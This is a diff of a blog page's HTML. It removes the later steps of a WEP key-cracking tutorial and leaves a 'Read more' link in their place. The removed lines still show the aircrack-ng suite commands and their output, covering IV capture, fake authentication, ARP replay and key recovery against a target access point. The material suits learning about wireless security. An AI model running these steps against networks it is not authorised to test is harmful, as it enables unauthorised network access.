@@ -510,47 +510,8 @@ set envelope_from=yes
 </pre></div>
 </div>
 </li>
-<li><p class="first">Capture initialization vectors (IVs).</p>
-<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo airodump-ng -c 11 --bssid C0:3F:0E:D3:XX:XX -w c mon0</span>
-</pre></div>
-</div>
-<p><img alt="04_2" src="_images/04_2.png"/></p>
-</li>
-<li><p class="first">Fake authentication with the target AP.</p>
-<p>Assume our card MAC address is “64:D5:43:80:XX:XX”.</p>
-<p>Open a new terminal and run the following command.</p>
-<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo aireplay-ng -1 0 -e TARGET-NET -a C0:3F:0E:D3:XX:XX -h 64:D5:43:80:XX:XX mon0</span>
-<span class="go">20:46:23  Waiting for beacon frame (BSSID: C0:3F:0E:D3:XX:XX) on channel 11</span>
-
-<span class="go">20:46:23  Sending Authentication Request (Open System) [ACK]</span>
-<span class="go">20:46:23  Authentication successful</span>
-<span class="go">20:46:23  Sending Association Request</span>
-
-<span class="go">20:46:28  Sending Authentication Request (Open System) [ACK]</span>
-<span class="go">20:46:28  Authentication successful</span>
-<span class="go">20:46:28  Sending Association Request [ACK]</span>
-<span class="go">20:46:28  Association successful : -) (AID: 1)</span>
-</pre></div>
-</div>
-</li>
-<li><p class="first">Start ARP request replay mode to speed up the collecting of IVs</p>
-<p>Open another terminal and run the following command.</p>
-<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo aireplay-ng -3 -b C0:3F:0E:D3:XX:XX -h 64:D5:43:80:XX:XX mon0</span>
-<span class="go">Saving ARP requests in replay_arp-0108-214535.cap</span>
-<span class="go">You should also start airodump-ng to capture replies.</span>
-<span class="go">Read 336429 packets (got 138673 ARP requests and 15355 ACKs), sent 177878 packet</span>
-</pre></div>
-</div>
-<p>After that, the “#DATA” column in the terminal capturing IVs (in Step 5) can be seen incrementing faster.</p>
-</li>
-<li><p class="first">Obtain the WEP key using aircrack-ng.</p>
-<div class="highlight-shell-session"><div class="highlight"><pre><span class="go">$ sudo aircrack-ng -b C0:3F:0E:D3:XX:XX c*.cap</span>
-</pre></div>
-</div>
-<p><img alt="01" src="_images/01-e1357703129846.png"/></p>
-<p>With 23K IVs, the WEP key is calculated in less than 20 seconds.</p>
-</li>
 </ol>
+<p class="readmorewrapper"><a class="readmore" href="2013/01/08/wep_craking_experiment_on_ubuntu_12_10.html#more">Read more...</a></p> 
 
         <div class="postmeta">
         <div class="author">
